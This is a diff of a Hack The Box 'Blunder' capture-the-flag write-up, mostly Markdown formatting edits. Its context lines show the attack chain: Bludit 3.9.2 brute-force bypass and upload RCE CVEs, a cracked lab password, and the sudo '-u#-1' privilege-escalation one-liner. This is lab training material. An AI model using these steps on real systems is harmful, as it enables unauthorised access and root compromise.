@@ -1,11 +1,7 @@
 ![](blunder-banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
 </p>
-
-||
-|-----------|
-|Start with the nmap only found the web_server on port 80. running gobuster discovers __todo.txt__  and __admin__ page. In the txt file found username __fergus__ and from admin page found out that the server is running __Bludit-CMS__ and the running CMS version is vulnerable for __password bruteforce attack__ and __auth Directory Traversal__ vulnerability and after getting user fergus password using bruteforce attack i get shell as user __www-data__ with Directory Traversal vulnerability. After some enumeration found user __Hugo__ creds from the server files and get the __user_flag__. User hugo have all sudo rights and the sudo version in the box is vulnerable for sudo security bypass exploit and from that get the __Root_flag__.|
 
 # Scanning
 
@@ -33,27 +29,27 @@ PORT   STATE  SERVICE VERSION
 ### /todo.txt
 `-Inform fergus that the new blog needs images - PENDING`
 
-potential username __fergus__
+potential username **fergus**
 
 ## Google
-__search :__ `bludit 3.9.2 vulnerability`
+**search :** `bludit 3.9.2 vulnerability`
 
-__*2 CVEs Found*__
+**2 CVEs Found**
 
-__CVE-2019-17240__:*bl-kernel/security.class.php in Bludit 3.9.2 allows attackers to bypass a brute-force protection mechanism by using many different forged X-Forwarded-For or Client-IP HTTP headers.* 
+**CVE-2019-17240**:*bl-kernel/security.class.php in Bludit 3.9.2 allows attackers to bypass a brute-force protection mechanism by using many different forged X-Forwarded-For or Client-IP HTTP headers.* 
 
-__CVE-2019-16113 (1 Metasploit modules)__:*Bludit 3.9.2 allows remote code execution via bl-kernel/ajax/upload-images.php because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname.* 
+**CVE-2019-16113 (1 Metasploit modules)**:*Bludit 3.9.2 allows remote code execution via bl-kernel/ajax/upload-images.php because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname.* 
 
 # User Exploiting
 
 ## CVE-2019-17240
-__*Discoverer*__: Rastating
-__*References*__: [rastating.github.io](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) Blog post.
+**Discoverer**: Rastating
+**References**: [rastating.github.io](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) Blog post.
 
 - requirements
 
-  - __username:__ fergus
-  - __wordlist:__ *create a wordlist from the website text*
+  - **username:** fergus
+  - **wordlist:** *create a wordlist from the website text*
   
         cewl http://10.10.10.191 -w wordlist
 
@@ -70,13 +66,13 @@ __*References*__: [rastating.github.io](https://rastating.github.io/bludit-brute
       fergus:RolandDeschain
 
 ## CVE-2019-16113
-__*Discoverer*__: Christasa
-__*References*__: [issue 1081](https://github.com/bludit/bludit/issues/1081)
+**Discoverer**: Christasa
+**References**: [issue 1081](https://github.com/bludit/bludit/issues/1081)
 
 - requirements
 
-  - __username:__ fergus
-  - __password:__ RolandDeschain
+  - **username:** fergus
+  - **password:** RolandDeschain
 
 
 ### Exploiting
@@ -121,7 +117,7 @@ __*References*__: [issue 1081](https://github.com/bludit/bludit/issues/1081)
 	$ export TERM=xterm-256color
 	$ stty rows <num> columns <cols>
 
-__for meterpreter shell upgrade :__ [hackingarticles.in blog](https://www.hackingarticles.in/command-shell-to-meterpreter/)
+**for meterpreter shell upgrade :** [hackingarticles.in blog](https://www.hackingarticles.in/command-shell-to-meterpreter/)
 
 ### Local Enumeration
 
@@ -144,7 +140,7 @@ __for meterpreter shell upgrade :__ [hackingarticles.in blog](https://www.hackin
 
 # Root Prevesc
 
-- __Enumeration__
+- **Enumeration**
 
 	  $ su - hugo
 	  su - hugo
@@ -166,9 +162,9 @@ __for meterpreter shell upgrade :__ [hackingarticles.in blog](https://www.hackin
 
 
 ### Google
-__search :__ `sudo ALL, !root privesc`
+**search :** `sudo ALL, !root privesc`
 
-__*1 CVE Found*__
+**1 CVE Found**
 
 #### CVE-2019-14287
 
@@ -186,6 +182,6 @@ EDB-ID: [47502](https://www.exploit-db.com/exploits/47502)
 	  User hugo may run the following commands on blunder:
 	      (ALL, !root) /bin/bash
     
-__EXPLOIT :__ 
+**EXPLOIT :** 
 
 	$ sudo -u#-1 /bin/bash
